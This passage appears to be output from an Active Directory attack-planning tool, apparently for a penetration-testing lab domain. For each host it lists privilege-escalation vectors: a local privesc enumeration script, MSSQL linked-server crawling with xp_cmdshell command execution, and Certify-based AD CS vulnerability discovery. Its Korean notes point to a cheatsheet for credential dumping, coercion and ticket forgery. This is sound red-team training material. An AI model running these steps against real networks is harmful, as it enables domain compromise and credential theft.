- **DCORP-APPSRV$**: localpriv → `python localpriv.py --enum`
- **DCORP-CI$**: localpriv → `python localpriv.py --enum`
- **DCORP-DC$**: localpriv → `python localpriv.py --enum`
- **DCORP-MGMT$**: localpriv → `python localpriv.py --enum`
- **DCORP-MSSQL$**: MSSQL → `Get-SQLServerLinkCrawl`/`xp_cmdshell` (링크드서버 체인) · localpriv → `python localpriv.py --enum`
- **DCORP-SQL1$**: MSSQL → `Get-SQLServerLinkCrawl`/`xp_cmdshell` (링크드서버 체인) · localpriv → `python localpriv.py --enum`
- **DCORP-STD201$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD202$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD203$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD204$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD205$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD206$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD207$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD208$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD209$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD210$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD211$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD212$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD213$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD214$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD215$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD216$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD217$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD218$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD219$**: localpriv → `python localpriv.py --enum`
- **DCORP-STD220$**: localpriv → `python localpriv.py --enum`
- **DCORP-STDADMIN$**: localpriv → `python localpriv.py --enum`

> 초기 발판은 특정 앱으로 가정하지 않음 — 닿는 포트/서비스 스캔 후 발견된 것에서 진입.
> **AD CS (ESC1-15)** 도 BloodHound 밖: `Certify.exe find /vulnerable` → `python adcs.py --certify out.txt` 로 탐지 (결과는 위 'AD CS 권한상승 후보' phase에 병합).
> **로컬 privesc**: 박스에서 `python localpriv.py --enum` 후 캡처 → 파싱.
> **실행(HOW) 명령 레시피** — 자격추출/측면이동/coercion/인증서인증/티켓위조/덤프 등 '수동' 구간의 바로 칠 명령: `knowledge/execution_cheatsheet.md` 참조.